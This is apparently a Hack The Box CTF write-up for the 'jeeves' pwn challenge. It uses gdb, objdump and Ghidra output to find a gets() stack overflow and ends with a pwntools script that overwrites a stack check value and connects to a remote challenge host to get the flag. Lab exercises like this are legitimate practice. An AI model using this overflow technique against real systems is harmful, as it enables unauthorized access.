



# Notes
//load elf into gdb
gdb-gef jeeves

disass main
```
   ...snipped...
   0x0000000000001219 <+48>:    call   0x10d0 <gets@plt>
   0x000000000000121e <+53>:    lea    -0x40(%rbp),%rax
   ...snipped...
```
//set breakpoint after gets call
b *main+53

//run
r

//input "FOOBAR" at prompt
```nasm
Hello, good sir!
May I have your name? FOOBAR
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffe100 --> 0x5241424f4f46 ('FOOBAR')
RBX: 0x5555555552b0 (<__libc_csu_init>: endbr64)
RCX: 0x7ffff7f9f9a0 --> 0xfbad2288 
RDX: 0x0 
RSI: 0x41424f4f ('OOBA')
RDI: 0x7ffff7fa2680 --> 0x0 
RBP: 0x7fffffffe140 --> 0x0 
RSP: 0x7fffffffe100 --> 0x5241424f4f46 ('FOOBAR')
RIP: 0x55555555521e (<main+53>: lea    rax,[rbp-0x40])
R8 : 0x7fffffffe100 --> 0x5241424f4f46 ('FOOBAR')
R9 : 0x0 
R10: 0x5d (']')
R11: 0x246 
R12: 0x555555555100 (<_start>:  endbr64)
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x555555555211 <main+40>:    mov    rdi,rax
   0x555555555214 <main+43>:    mov    eax,0x0
   0x555555555219 <main+48>:    call   0x5555555550d0 <gets@plt>
=> 0x55555555521e <main+53>:    lea    rax,[rbp-0x40]
   0x555555555222 <main+57>:    mov    rsi,rax
   0x555555555225 <main+60>:    lea    rdi,[rip+0xe04]        # 0x555555556030
   0x55555555522c <main+67>:    mov    eax,0x0
   0x555555555231 <main+72>:    call   0x5555555550a0 <printf@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe100 --> 0x5241424f4f46 ('FOOBAR')
0008| 0x7fffffffe108 --> 0x5555555552fd (<__libc_csu_init+77>:  add    rbx,0x1)
0016| 0x7fffffffe110 --> 0x0 
0024| 0x7fffffffe118 --> 0x5555555552b0 (<__libc_csu_init>:     endbr64)
0032| 0x7fffffffe120 --> 0x0 
0040| 0x7fffffffe128 --> 0x555555555100 (<_start>:      endbr64)
0048| 0x7fffffffe130 --> 0x7fffffffe230 --> 0x1 
0056| 0x7fffffffe138 --> 0xdeadc0d300000000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x000055555555521e in main ()
```
//calculate the num of bytes between the start of the input address and start of check by subtracting the mem addresses found in the stack. (...fe13c - ...fe100 = 3c). 0x3c = 60bytes  
```
gef➤  search-pattern FOOBAR
[+] Searching 'FOOBAR' in memory
[+] In '[heap]'(0x555555559000-0x55555557a000), permission=rw-
  0x5555555596b0 - 0x5555555596b8  →   "FOOBAR\n" 
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffe100 - 0x7fffffffe106  →   "FOOBAR" 
gef➤  search-pattern 0xdeadc0d3
[+] Searching '\xd3\xc0\xad\xde' in memory
[+] In '/home/kali/Desktop/pwn/htb_challenges/jeeves/jeeves'(0x555555555000-0x555555556000), permission=r-x
  0x5555555551f8 - 0x555555555208  →   "\xd3\xc0\xad\xde[...]" 
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffe13c - 0x7fffffffe14c  →   "\xd3\xc0\xad\xde[...]" 
```
# exploit
```
from pwn import *

buf = b'A' * 60
payload = buf + p64(0x1337bab3)

r = remote(b'159.65.58.189', 32040)
r.sendline(payload)
print(r.recvall())
```

# Raw
```
└─# file jeeves               
jeeves: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=18c31354ce48c8d63267a9a807f1799988af27bf, for GNU/Linux 3.2.0, not stripped

└─# checksec jeeves
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

└─# objdump -D jeeves | grep @
0000000000001090 <__cxa_finalize@plt>:
    1094: f2 ff 25 5d 2f 00 00  bnd jmp *0x2f5d(%rip)        # 3ff8 <__cxa_finalize@GLIBC_2.2.5>
00000000000010a0 <printf@plt>:
    10a4: f2 ff 25 fd 2e 00 00  bnd jmp *0x2efd(%rip)        # 3fa8 <printf@GLIBC_2.2.5>
00000000000010b0 <close@plt>:
    10b4: f2 ff 25 f5 2e 00 00  bnd jmp *0x2ef5(%rip)        # 3fb0 <close@GLIBC_2.2.5>
00000000000010c0 <read@plt>:
    10c4: f2 ff 25 ed 2e 00 00  bnd jmp *0x2eed(%rip)        # 3fb8 <read@GLIBC_2.2.5>
00000000000010d0 <gets@plt>:
    10d4: f2 ff 25 e5 2e 00 00  bnd jmp *0x2ee5(%rip)        # 3fc0 <gets@GLIBC_2.2.5>
00000000000010e0 <malloc@plt>:
    10e4: f2 ff 25 dd 2e 00 00  bnd jmp *0x2edd(%rip)        # 3fc8 <malloc@GLIBC_2.2.5>
00000000000010f0 <open@plt>:
    10f4: f2 ff 25 d5 2e 00 00  bnd jmp *0x2ed5(%rip)        # 3fd0 <open@GLIBC_2.2.5>
    1128: ff 15 b2 2e 00 00     call   *0x2eb2(%rip)        # 3fe0 <__libc_start_main@GLIBC_2.2.5>
    11ae: 48 83 3d 42 2e 00 00  cmpq   $0x0,0x2e42(%rip)        # 3ff8 <__cxa_finalize@GLIBC_2.2.5>
    11c2: e8 c9 fe ff ff        call   1090 <__cxa_finalize@plt>
    1208: e8 93 fe ff ff        call   10a0 <printf@plt>
    1219: e8 b2 fe ff ff        call   10d0 <gets@plt>
    1231: e8 6a fe ff ff        call   10a0 <printf@plt>
    1244: e8 97 fe ff ff        call   10e0 <malloc@plt>
    125e: e8 8d fe ff ff        call   10f0 <open@plt>
    127c: e8 3f fe ff ff        call   10c0 <read@plt>
    1294: e8 07 fe ff ff        call   10a0 <printf@plt>
    12a3: e8 08 fe ff ff        call   10b0 <close@plt>
```

## Decompiler ghidra
![](img/decompiler_main.png)
```
undefined8 main(void)

{
  char local_48 [44];
  int local_1c;
  void *local_18;
  int local_c;
  
  local_c = -0x21523f2d;
  printf("Hello, good sir!\nMay I have your name? ");
  gets(local_48);
  printf("Hello %s, hope you have a good day!\n",local_48);
  if (local_c == 0x1337bab3) {
    local_18 = malloc(0x100);
    local_1c = open("flag.txt",0);
    read(local_1c,local_18,0x100);
    printf("Pleased to make your acquaintance. Here\'s a small gift: %s\n",local_18);
    close(local_1c);
  }
  return 0;
}
```

## Disassembly ghidra
![](img/disassembly_main.png)
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                       undefined8 __stdcall main(void)
             undefined8        RAX:8          <RETURN>
             undefined4        Stack[-0xc]:4  local_c                                 XREF[2]:     001011f5(W), 
                                                                                                   00101236(R)  
             undefined8        Stack[-0x18]:8 local_18                                XREF[3]:     00101249(W), 
                                                                                                   00101266(R), 
                                                                                                   00101281(R)  
             undefined4        Stack[-0x1c]:4 local_1c                                XREF[3]:     00101263(W), 
                                                                                                   0010126a(R), 
                                                                                                   00101299(R)  
             undefined1        Stack[-0x48]:1 local_48                                XREF[2]:     0010120d(*), 
                                                                                                   0010121e(*)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:00101121(*), 001020c8, 
                                                                                          00102170(*)  
     001011e9 f3 0f 1e fa             ENDBR64
     001011ed 55                      PUSH       RBP
     001011ee 48 89 e5                MOV        RBP,RSP
     001011f1 48 83 ec 40             SUB        RSP,0x40
     001011f5 c7 45 fc d3 c0 ad de    MOV        dword ptr [RBP + local_c],0xdeadc0d3
     001011fc 48 8d 3d 05 0e 00 00    LEA        RDI,[s_Hello,_good_sir!_May_I_have_your_00102008]  = "Hello, good sir!\nMay I have your name? "
     00101203 b8 00 00 00 00          MOV        EAX,0x0
     00101208 e8 93 fe ff ff          CALL       <EXTERNAL>::printf                                 int printf(char * __format, ...)
     0010120d 48 8d 45 c0             LEA        RAX=>local_48,[RBP + -0x40]
     00101211 48 89 c7                MOV        RDI,RAX
     00101214 b8 00 00 00 00          MOV        EAX,0x0
     00101219 e8 b2 fe ff ff          CALL       <EXTERNAL>::gets                                   char * gets(char * __s)
     0010121e 48 8d 45 c0             LEA        RAX=>local_48,[RBP + -0x40]
     00101222 48 89 c6                MOV        RSI,RAX
     00101225 48 8d 3d 04 0e 00 00    LEA        RDI,[s_Hello_%s,_hope_you_have_a_good_d_00102030]  = "Hello %s, hope you have a good day!\n"
     0010122c b8 00 00 00 00          MOV        EAX,0x0
     00101231 e8 6a fe ff ff          CALL       <EXTERNAL>::printf                                 int printf(char * __format, ...)
     00101236 81 7d fc b3 ba 37 13    CMP        dword ptr [RBP + local_c],0x1337bab3
     0010123d 75 69                   JNZ        LAB_001012a8
     0010123f bf 00 01 00 00          MOV        EDI,0x100
     00101244 e8 97 fe ff ff          CALL       <EXTERNAL>::malloc                                 void * malloc(size_t __size)
     00101249 48 89 45 f0             MOV        qword ptr [RBP + local_18],RAX
     0010124d be 00 00 00 00          MOV        ESI,0x0
     00101252 48 8d 3d fc 0d 00 00    LEA        RDI,[s_flag.txt_00102055]                          = "flag.txt"
     00101259 b8 00 00 00 00          MOV        EAX,0x0
     0010125e e8 8d fe ff ff          CALL       <EXTERNAL>::open                                   int open(char * __file, int __oflag, ...)
     00101263 89 45 ec                MOV        dword ptr [RBP + local_1c],EAX
     00101266 48 8b 4d f0             MOV        RCX,qword ptr [RBP + local_18]
     0010126a 8b 45 ec                MOV        EAX,dword ptr [RBP + local_1c]
     0010126d ba 00 01 00 00          MOV        EDX,0x100
     00101272 48 89 ce                MOV        RSI,RCX
     00101275 89 c7                   MOV        EDI,EAX
     00101277 b8 00 00 00 00          MOV        EAX,0x0
     0010127c e8 3f fe ff ff          CALL       <EXTERNAL>::read                                   ssize_t read(int __fd, void * __buf, size_t __nbytes)
     00101281 48 8b 45 f0             MOV        RAX,qword ptr [RBP + local_18]
     00101285 48 89 c6                MOV        RSI,RAX
     00101288 48 8d 3d d1 0d 00 00    LEA        RDI,[s_Pleased_to_make_your_acquaintanc_00102060]  = "Pleased to make your acquaintance. Here's a small gift: %s\n"
     0010128f b8 00 00 00 00          MOV        EAX,0x0
     00101294 e8 07 fe ff ff          CALL       <EXTERNAL>::printf                                 int printf(char * __format, ...)
     00101299 8b 45 ec                MOV        EAX,dword ptr [RBP + local_1c]
     0010129c 89 c7                   MOV        EDI,EAX
     0010129e b8 00 00 00 00          MOV        EAX,0x0
     001012a3 e8 08 fe ff ff          CALL       <EXTERNAL>::close                                  int close(int __fd)
                             LAB_001012a8                                    XREF[1]:     0010123d(j)  
     001012a8 b8 00 00 00 00          MOV        EAX,0x0
     001012ad c9                      LEAVE
     001012ae c3                      RET
     001012af 90                      ??         90h
```

# TAGS: stack htb pwn jeeves